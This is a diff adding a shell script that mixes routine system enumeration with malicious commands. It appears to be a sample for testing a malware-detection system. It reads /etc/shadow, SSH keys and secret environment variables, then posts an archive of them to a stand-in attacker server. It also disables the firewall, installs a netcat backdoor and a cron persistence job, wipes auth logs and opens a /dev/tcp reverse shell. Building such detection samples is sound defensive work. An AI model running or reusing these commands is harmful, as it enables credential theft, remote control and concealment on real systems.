@@ -1,0 +1,141 @@
+# Suspicious System Administration Script
+# This file contains commands that appear legitimate but have malicious intent
+
+# System Information Gathering (legitimate looking)
+echo "=== System Information ==="
+uname -a
+whoami
+id
+pwd
+date
+
+# Network Configuration (with suspicious patterns)
+echo "=== Network Configuration ==="
+ifconfig
+netstat -tuln
+ss -tuln
+route -n
+
+# Process Information (looking for specific processes)
+echo "=== Running Processes ==="
+ps aux | grep -E "(http|ftp|ssh|telnet|backdoor|trojan)"
+top -bn1
+
+# System Services (checking for security services)
+echo "=== System Services ==="
+systemctl list-units --type=service
+service --status-all
+
+# File System Information (looking for sensitive files)
+echo "=== File System ==="
+df -h
+lsblk
+mount
+find /home -name "*.key" -o -name "*.pem" -o -name "id_rsa*" 2>/dev/null
+
+# User Information (collecting user data)
+echo "=== User Information ==="
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+last
+
+# System Logs (looking for security events)
+echo "=== System Logs ==="
+tail -n 20 /var/log/syslog
+tail -n 20 /var/log/auth.log
+tail -n 20 /var/log/kern.log
+grep -i "password\|login\|admin" /var/log/auth.log
+
+# Network Connections (monitoring network activity)
+echo "=== Network Connections ==="
+lsof -i
+netstat -an
+ss -tuln
+# Suspicious network activity
+curl -s http://malicious-site.com/collect
+wget -q http://evil-server.com/data
+
+# System Resources (checking for resource usage)
+echo "=== System Resources ==="
+free -h
+vmstat 1 5
+iostat 1 5
+
+# Security Information (checking security settings)
+echo "=== Security Information ==="
+chkconfig --list
+iptables -L
+ufw status
+# Attempting to disable security
+ufw disable
+iptables -F
+
+# Backup Operations (exfiltrating data)
+echo "=== Backup Operations ==="
+tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /home
+# Upload to external server
+curl -X POST -F "file=@/tmp/sensitive_data.tar.gz" http://malicious-server.com/upload
+rsync -av /home/ /tmp/stolen_data/
+
+# System Maintenance (with malicious modifications)
+echo "=== System Maintenance ==="
+apt update
+apt upgrade -y
+# Installing backdoor
+apt install -y netcat-openbsd
+# Creating backdoor service
+echo '#!/bin/bash' > /etc/systemd/system/backdoor.service
+echo 'nc -l -p 4444 -e /bin/bash' >> /etc/systemd/system/backdoor.service
+systemctl enable backdoor.service
+systemctl start backdoor.service
+
+# Log Rotation (hiding malicious activity)
+echo "=== Log Rotation ==="
+logrotate -f /etc/logrotate.conf
+# Clearing logs to hide activity
+> /var/log/syslog
+> /var/log/auth.log
+
+# Cron Jobs (installing persistent backdoor)
+echo "=== Cron Jobs ==="
+crontab -l
+# Adding malicious cron job
+(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash /tmp/backdoor.sh") | crontab -
+cat /etc/crontab
+
+# Environment Variables (collecting sensitive data)
+echo "=== Environment Variables ==="
+env
+printenv
+# Looking for API keys and passwords
+env | grep -i "key\|pass\|secret\|token"
+
+# System Configuration (modifying system settings)
+echo "=== System Configuration ==="
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+cat /etc/fstab
+# Adding malicious DNS server
+echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+
+# Hardware Information (system fingerprinting)
+echo "=== Hardware Information ==="
+lscpu
+lsmem
+lspci
+lsusb
+dmidecode
+
+# Additional malicious patterns
+echo "=== Additional Suspicious Activity ==="
+# Creating hidden files
+touch /tmp/.hidden_backdoor
+# Setting up reverse shell
+bash -i >& /dev/tcp/evil-server.com/8080 0>&1 &
+# Registry manipulation (Windows simulation)
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f
+
+# This script appears legitimate but contains malicious patterns
+# It should be flagged as malicious by the detection system
